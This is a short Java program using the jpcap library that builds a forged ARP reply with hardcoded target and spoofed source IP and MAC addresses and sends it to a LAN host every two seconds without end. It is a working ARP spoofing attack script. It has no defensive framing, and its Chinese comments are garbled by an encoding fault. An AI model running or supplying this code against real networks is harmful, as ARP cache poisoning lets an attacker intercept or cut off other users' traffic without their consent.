package Util;

import java.net.InetAddress;
import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;

public class WTest {
	static byte[] stomac(String s) {
		byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };
		String[] s1 = s.split("-");
		for (int x = 0; x < s1.length; x++) {
			mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) & 0xff);
		}
		return mac;
	}
	public static void main(String[] args) throws Exception {
		int time = 2;  // 閲嶅彂闂撮殧鏃堕棿
		InetAddress desip = InetAddress.getByName("192.168.1.2");// 琚楠楃殑鐩爣IP鍦板潃
		byte[] desmac = stomac("00-1c-23-3c-41-7f");// 琚楠楃殑鐩爣鐩爣MAC鏁扮粍
		InetAddress srcip = InetAddress.getByName("192.168.1.3");// 婧怚P鍦板潃
		byte[] srcmac = stomac("00-1C-23-2E-A7-0A"); // 鍋囩殑MAC鏁扮粍
		// 鏋氫妇缃戝崱骞舵墦寮�璁惧
		NetworkInterface[] devices = JpcapCaptor.getDeviceList();
		NetworkInterface device = devices[1];
		JpcapSender sender = JpcapSender.openDevice(device);
		// 璁剧疆ARP鍖�
		ARPPacket arp = new ARPPacket();
		arp.hardtype = ARPPacket.HARDTYPE_ETHER;
		arp.prototype = ARPPacket.PROTOTYPE_IP;
		arp.operation = ARPPacket.ARP_REPLY;
		arp.hlen = 6;
		arp.plen = 4;
		arp.sender_hardaddr = srcmac;
		arp.sender_protoaddr = srcip.getAddress();
		arp.target_hardaddr = desmac;
		arp.target_protoaddr = desip.getAddress();
		// 璁剧疆DLC甯�
		EthernetPacket ether = new EthernetPacket();
		ether.frametype = EthernetPacket.ETHERTYPE_ARP;
		ether.src_mac = srcmac;
		ether.dst_mac = desmac;
		arp.datalink = ether;
		// 鍙戦�丄RP搴旂瓟鍖�
		while (true) {
			System.out.println("sending arp..");
			sender.sendPacket(arp);
			Thread.sleep(time * 1000);
		}
	}
}
